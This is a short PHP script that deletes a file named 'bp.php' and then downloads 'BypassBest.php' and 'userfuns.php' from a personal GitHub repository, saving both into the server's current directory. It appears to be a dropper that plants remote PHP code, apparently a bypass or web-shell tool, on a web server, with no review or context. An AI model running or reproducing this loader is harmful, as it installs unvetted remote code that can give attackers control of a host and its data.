<?php
// Remove the bp.php file if it exists
if (file_exists('bp.php')) {
    unlink('bp.php');
}

// URLs to download the files from
$bpUrl = 'https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/BypassBest.php';
$userfunsUrl = 'https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/userfuns.php';

// Download the contents of the files
$bpContent = file_get_contents($bpUrl);
$userfunsContent = file_get_contents($userfunsUrl);

// Save the contents to files
file_put_contents('bp.php', $bpContent);
file_put_contents('userfuns.php', $userfunsContent);

echo "Files downloaded and saved successfully.\n";
?>
